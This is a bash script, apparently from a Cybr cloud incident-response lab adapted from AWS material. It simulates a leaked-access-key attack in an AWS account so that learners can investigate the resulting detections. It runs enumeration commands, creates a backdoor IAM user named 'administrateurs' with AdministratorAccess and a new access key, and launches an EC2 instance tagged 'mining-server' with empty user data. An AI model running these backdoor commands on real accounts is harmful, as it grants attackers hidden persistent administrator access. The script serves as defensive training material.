# Modified by the Cybr team, but originally published by the AWS team with:
# MIT No Attribution
# 
# Copyright 2022 AWS
# 
# Permission is hereby granted, free of charge, to any person obtaining a copy of this
# software and associated documentation files (the "Software"), to deal in the Software
# without restriction, including without limitation the rights to use, copy, modify,
# merge, publish, distribute, sublicense, and/or sell copies of the Software, and to
# permit persons to whom the Software is furnished to do so.
# 
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED,
# INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A
# PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT
# HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION
# OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE
# SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
#
#!/bin/bash

# Arguments:
# - Profile: the AWS CLI profile to use to access credentials

# Scenario:
# - An access key was leaked. This is a fairly common issue: https://cloudsec.cybr.com/aws/incident-response/real-world-case-studies/
# - Access key grants access to a user who has admin access
# - Attacker enumerates basic VPC information
# - Attacker realizes they can launch EC2 instances
# - Attacker launches an EC2 instance and crypto mines from it
# (Hopefully) this triggers a detection alert which you then investigate
# You assume your SecurityAnalyst role and investigate with Athena. Refer to the course for next steps!

# Check if two arguments were provided
if [ "$#" -ne 1 ]; then
    echo "Usage: $0 <profile>"
    exit 1
fi

# Assign the provided arguments to variables
profile=$1

mkdir output

echo "Creating Resources for Simulation..."
echo "" | base64 -d > ./output/userdata.txt

# Generate some noise
aws sts get-caller-identity --profile ${profile}
aws iam list-attached-user-policies --user-name Michael --profile ${profile}

# Create user and access key backdoor
aws iam create-user --user-name "administrateurs" --profile ${profile}
aws iam attach-user-policy --user-name "administrateurs" --policy-arn arn:aws:iam::aws:policy/AdministratorAccess --profile ${profile}
aws iam create-access-key --user-name "administrateurs" --profile ${profile}

# Look up VPCs, Subnets, and AMIs
export VPCID=$(aws ec2 describe-vpcs --query 'Vpcs[*].{VpcId:VpcId}' --output text --profile ${profile})

export SUBNETID=$(aws ec2 describe-subnets --filters "Name=tag:Application,Values=cybrlabsirec2crypto" --query "Subnets[*].SubnetId" --output text --profile ${profile})

aws ec2 describe-images --owners amazon --filters "Name=name,Values=amzn2-ami-hvm-2.0.*" "Name=state,Values=available" --query "reverse(sort_by(Images, &Name))[:1].ImageId" --region us-east-1 --profile ${profile} > ./output/AMI1.json

export AMI1=$(jq -r '.[]' ./output/AMI1.json)

# Create instance
ec2_output=$(aws ec2 run-instances --image-id ${AMI1} --instance-type t3.nano --count 1 --region us-east-1 --user-data file://output/userdata.txt --subnet-id ${SUBNETID} --tag-specifications 'ResourceType=instance,Tags=[{Key=Name,Value=mining-server}]' --profile ${profile})
echo "$ec2_output" >> ./output/log.txt
instance_id=$(echo $ec2_output | jq -r '.Instances[0].InstanceId')
echo "Instance ID: $instance_id"

echo "Resource Creation Complete"
echo "---"
#echo "Cleaning Up Files"
# rm userdata.txt
# rm AMI1.json
# rm log.txt
#echo "File Cleanup Complete"
#echo "---"
echo "End of Simulation Script"